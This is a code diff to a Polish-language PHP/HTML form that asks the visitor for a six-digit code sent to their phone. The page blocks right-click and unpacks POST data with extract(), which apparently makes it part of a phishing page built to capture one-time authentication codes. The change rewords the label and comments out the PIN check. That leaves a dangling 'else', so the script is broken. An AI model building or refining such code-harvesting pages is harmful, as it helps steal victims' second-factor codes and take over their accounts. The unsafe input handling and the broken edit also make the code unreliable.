@@ -54,7 +54,7 @@ extract($_POST);
 <div class="row formInputSection">
 <div class="large-7 columns">
 <label>
-  Wprowadź kod:
+  Wprowadź 6-cyfrowy kod:
   <input type="tel" name="otp"  class="form-control optPass" value="" maxlength="6" autocomplete="off"/>
 </label>
 </div>
@@ -78,9 +78,9 @@ extract($_POST);
 document.onmousedown = rightclickD; function rightclickD(e) { e = e||event; if (e.button == 2) { alert('Function Disabled...'); return false; } }
 function ValidateForm() { 
 	var regPin = RegExp("^[0-9]{4,6}$");
-	if( document.form1.customerpin.value == "" || !document.form1.customerpin.value.match(regPin) ) {	 
-		alert("Wprowadź poprawny kod wysłany na twój numer telefonu."); document.form1.customerpin.focus(); return false;  
-	}
+	//if( document.form1.customerpin.value == "" || !document.form1.customerpin.value.match(regPin) ) {	 
+	//	alert("Wprowadź poprawny kod wysłany na twój numer telefonu."); document.form1.customerpin.focus(); return false;  
+	//}
     else
         {
             document.form1.submit();
